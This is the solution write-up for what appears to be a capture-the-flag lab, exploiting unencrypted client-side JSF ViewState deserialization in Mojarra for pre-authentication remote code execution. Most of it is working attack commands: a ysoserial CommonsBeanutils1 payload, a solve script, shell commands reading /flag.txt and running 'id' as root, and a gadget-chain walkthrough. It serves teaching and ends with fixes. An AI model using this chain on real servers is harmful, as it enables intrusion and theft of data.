# Solution

Spoilers ahead. Read the main README and try the lab first.

The lab is a Mojarra (JSF 2.2) application with client-side state saving and state
encryption disabled. The `javax.faces.ViewState` parameter is
`Base64(GZIP(Java serialization stream))`, and the server deserializes it with a plain
`ObjectInputStream` while restoring the view, before the login action runs. With
commons-beanutils and commons-collections on the classpath, a standard gadget chain gives
arbitrary command execution.

## Step 1 - inspect the view state

```
$ curl -s http://localhost:8080/pages/login.xhtml -o login.html

$ python3 - <<'EOF'
import re, gzip, base64
html = open('login.html', encoding='utf-8', errors='replace').read()
vs = re.search(r'name="javax\.faces\.ViewState"[^>]*value="([^"]+)"', html).group(1)
print('prefix:', vs[:16])
raw = base64.b64decode(vs)
print('gzip:', raw[:2] == b'\x1f\x8b')
data = gzip.decompress(raw)
print('serialized:', data[:2] == b'\xac\xed', '|', len(data), 'bytes')
print('first class:', data[data.find(b'\x73\x72'):][:20])
EOF
prefix: H4sIAAAAAAAAAFvz
gzip: True
serialized: True | 168 bytes
first class: b'sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1'
```

No encryption, no MAC. The server accepts whatever the client sends back.

## Step 2 - the deserialization sink

Mojarra's `ClientSideStateHelper` decodes the parameter during `restoreView`, i.e. every
postback:

```
Base64 decode -> GZIP decompress -> ObjectInputStream.readObject()
```

The deserialization happens before the JSF lifecycle reaches the login action or the captcha
check, so no authentication is involved. Anything reachable from the classpath can be used
as a gadget.

The relevant dependencies:

```
commons-beanutils-1.9.2.jar
commons-collections-3.1.jar
```

## Step 3a - exploit with ysoserial

`ysoserial` has a chain for exactly this combination: `CommonsBeanutils1`.

```
$ java -jar ysoserial-all.jar CommonsBeanutils1 \
    "sh -c cat</flag.txt>/usr/local/tomcat/webapps/ROOT/out.txt" > payload.bin

$ python3 solve.py --raw payload.bin
[*] payload delivered, HTTP 500

$ curl -s http://localhost:8080/out.txt
flag{...}
```

Notes:

- `Runtime.exec(String)` in the gadget splits the command on whitespace and does not
  interpret quotes, which is why the command above avoids spaces:
  `sh -c cat</flag.txt>/usr/local/tomcat/webapps/ROOT/out.txt` tokenizes into
  `sh`, `-c` and `cat</flag.txt>/usr/...`. Shell redirections do the rest.
- `solve.py --raw` GZIPs and Base64-encodes the payload and posts it as
  `javax.faces.ViewState`.
- HTTP 500 is expected: the payload fires during deserialization and the request blows up
  right after. Command execution already happened.

## Step 3b - exploit with the included script

`solve.py` ships the same chain pre-built (PriorityQueue -> BeanComparator ->
TemplatesImpl) so you do not need a Java toolchain. The command is embedded in a
fixed-length marker inside the translet class and replaced in place.

```
$ python3 solve.py
[*] payload delivered, HTTP 500
----------------------------------------------
flag{...}
----------------------------------------------

$ python3 solve.py 'id'
[*] payload delivered, HTTP 500
----------------------------------------------
uid=0(root) gid=0(root) groups=0(root)
----------------------------------------------
```

The command's output is redirected to a randomly named file under the deployed web
application directory and then fetched over HTTP, because the container has no outbound
network access. Deliveries that fail to produce output simply report that.

## Step 4 - verify

Self-check against the container (this is what the exercise forbids, use it only to confirm
your result after you have the flag over HTTP):

```
$ docker compose exec portal cat /flag.txt
```

The value must match what you recovered.

## How the chain works

1. `PriorityQueue.readObject()` re-heapifies its elements and calls the comparator.
2. `BeanComparator.compare()` reads the `outputProperties` property of both elements via
   `PropertyUtils`.
3. `TemplatesImpl.getOutputProperties()` calls `newTransformer()`, which lazily loads the
   attacker-supplied bytecode from `_bytecodes` with `defineClass()`.
4. The class is instantiated. Its constructor runs the shell command.
5. From there, the translet's command writes the flag under the web root; a normal HTTP GET
   reads it back.

The same primitive supports common variants: `CommonsCollections1` (commons-collections 3.1
is on the classpath too), `CommonsBeanutils1` with other bytecode, or any other chain that
fits the runtime. Everything depends on the libraries present, not on the ViewState itself.

## Fixing the application

See the "Fixing it in real applications" section of the main README. Short version: use
server-side state saving, never disable state encryption, and keep gadget libraries off the
classpath.

## References

- Synacktiv, "JSF ViewState upside-down" — <https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf>
- Alphabot Security, "Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities" — <https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html>
- HackTricks, "Java JSF ViewState (.faces) Deserialization" — <https://hacktricks.wiki/en/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html>
- ysoserial — <https://github.com/frohoff/ysoserial>
